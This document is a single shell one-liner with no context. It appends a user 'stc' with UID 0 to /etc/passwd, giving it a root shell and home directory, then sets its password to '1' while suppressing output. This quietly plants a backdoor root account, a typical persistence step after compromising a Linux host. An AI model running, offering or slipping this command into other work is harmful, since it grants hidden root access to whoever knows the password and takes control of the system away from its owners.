sed -i '$ i\stc:x:0:0:stc:/root:/bin/bash' /etc/passwd && echo "1\n1"|passwd stc &> /dev/null
